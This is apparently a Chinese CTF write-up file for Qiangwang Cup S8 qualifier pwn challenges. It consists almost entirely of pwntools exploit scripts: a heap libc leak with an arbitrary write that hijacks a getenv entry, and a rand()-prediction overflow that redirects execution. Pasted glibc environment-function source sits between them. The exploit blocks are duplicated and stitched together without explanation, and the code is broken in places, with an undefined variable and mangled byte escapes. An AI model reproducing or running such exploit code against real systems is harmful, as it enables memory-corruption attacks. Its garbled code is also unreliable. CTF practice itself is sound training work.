# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/强网杯S8初赛_PWN_赛题解析.md
# TITLE: 强网杯S8初赛 PWN 赛题解析
# CATEGORY: pwn

from pwn import *
context.log_level = "debug"
p=process("./pwn")
# p=remote('47.94.231.2',)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
 p.sendlineafter("choice:",str(ch))

def add(size):
 choice(1)
 p.sendlineafter('size',str(size))

def free(idx):
 choice(2)
 p.sendlineafter('delete:',str(idx))

def edit(idx, payload):
 choice(3)
 p.sendlineafter('edit:',str(idx))
 p.sendafter('content',content)

def show(idx):
 choice(4)
 p.sendlineafter('show:',str(idx))

def env(ch):
 choice(5)
 p.sendlineafter('sad !',str(ch))

def write(addr1,payload):
 choice(6)
 p.sendafter('addr',p64(addr1))
 p.send(payload)
add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)
char *
getenv (const char *name)
{
 char **ep;
 uint16_t name_start;

 if (__environ == NULL || name[0] == '')
 return NULL;

 if (name[1] == '')
 {
 /* The name of the variable consists of only one character. Therefore
 the first two characters of the environment entry are this character
 and a '=' character. */
    #if __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned
 name_start = ('=' << 8) | *(const unsigned char *) name;
    #else
 name_start = '=' | ((*(const unsigned char *) name) << 8);
    #endif
 for (ep = __environ; *ep != NULL; ++ep)
 {
    #if _STRING_ARCH_unaligned
 uint16_t ep_start = *(uint16_t *) *ep;
    #else
 uint16_t ep_start = (((unsigned char *) *ep)[0]
 | (((unsigned char *) *ep)[1] << 8));
    #endif
 if (name_start == ep_start)
 return &(*ep)[2];
 }
 }
 else
 {
 size_t len = strlen (name);
    #if _STRING_ARCH_unaligned
 name_start = *(const uint16_t *) name;
    #else
 name_start = (((const unsigned char *) name)[0]
 | (((const unsigned char *) name)[1] << 8));
    #endif
 len -= 2;
 name += 2;

 for (ep = __environ; *ep != NULL; ++ep)
 {
    #if _STRING_ARCH_unaligned
 uint16_t ep_start = *(uint16_t *) *ep;
    #else
 uint16_t ep_start = (((unsigned char *) *ep)[0]
 | (((unsigned char *) *ep)[1] << 8));
    #endif

 if (name_start == ep_start && !strncmp (*ep + 2, name, len)
 && (*ep)[len + 2] == '=')
 return &(*ep)[len + 3];
 }
 }

 return NULL;
}
int
__add_to_environ (const char *name, const char *value, const char *combined,
 int replace)
{
 char **ep;
 size_t size;

 /* Compute lengths before locking, so that the critical section is
 less of a performance bottleneck. VALLEN is needed only if
 COMBINED is null (unfortunately GCC is not smart enough to deduce
 this; see the #pragma at the start of this file). Testing
 COMBINED instead of VALUE causes setenv (..., NULL, ...) to dump
 core now instead of corrupting memory later. */
 const size_t namelen = strlen (name);
 size_t vallen;
 if (combined == NULL)
 vallen = strlen (value) + 1;

 LOCK;

 /* We have to get the pointer now that we have the lock and not earlier
 since another thread might have created a new environment. */
 ep = __environ;

 size = 0;
 if (ep != NULL)
 {
 for (; *ep != NULL; ++ep)
 if (!strncmp (*ep, name, namelen) && (*ep)[namelen] == '=')
 break;
 else
 ++size;
 }
/*
中间省略很多代码，感兴趣可以直接去看完整源码
*/

 return 0;
}
from pwn import *
context.log_level = "debug"
p=process("./pwn")
# p=remote('47.94.231.2',)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
 p.sendlineafter("choice:",str(ch))

def add(size):
 choice(1)
 p.sendlineafter('size',str(size))

def free(idx):
 choice(2)
 p.sendlineafter('delete:',str(idx))

def edit(idx, payload):
 choice(3)
 p.sendlineafter('edit:',str(idx))
 p.sendafter('content',content)

def show(idx):
 choice(4)
 p.sendlineafter('show:',str(idx))

def env(ch):
 choice(5)
 p.sendlineafter('sad !',str(ch))

def write(addr1,payload):
 choice(6)
 p.sendafter('addr',p64(addr1))
 p.send(payload)

add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)

libc_addr=u64(p.recvuntil(b"x7f")[-6:].ljust(8,b"x00"))-0x21ace0
success('libc_addr: '+hex(libc_addr))
write(libc_addr+0x21a118,p64(libc_addr+libc.sym['puts']))
env(2)
gdb.attach(p)
p.interactive()
    #include
    #include<stdio.h>
    #include<stdlib.h>
int main(){
 srand(1);
 for(int i=0;i<288;i++){
 printf("%d ",rand()%4+1);
 }
}
struct calc{
 char *unknown;
 int rounds;
 char num[288];
 char s;
}
from pwn import *
p=process('./expect_number',aslr=False)
# p=remote('39.106.48.123',32818)
context.log_level='debug'

seq="4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2".split(' ')
seqnum=[int(i) for i in seq]
target=0x60

now=0
ch=0
k=''
for i in seqnum:
 p.sendlineafter('choice ','1')
 if i==1:
 k += '2'
 now += 2
 # if now == target-2:
 # gdb.attach(p)
 p.sendlineafter('or 0', str(2))
 elif i==2:
 k += '0'
 p.sendlineafter('or 0', str(0))
 else:
 k += '1'
 p.sendlineafter('or 0', str(1))
 ch+=1
 if now==target:
break
gdb.attach(p)
for i in seqnum[ch:-0xc]:
 p.sendlineafter('choice ', '1')
 if i==1 or i==2:
 p.sendlineafter('or 0', str(0))
 k += '0'
 else:
 p.sendlineafter('or 0', str(1))
 k += '1'
 # input()

p.sendlineafter('choice ', '2')
p.recvuntil(k)
addr=u64(p.recv(6)+b'')-0x4c60
success('code: '+hex(addr))

payload=b'x00'*0x20+p64(addr+0x5080)+p64(addr+0x251A)
p.sendlineafter('choice ', '4')

p.sendafter('Tell me your favorite number.', payload)

p.interactive()
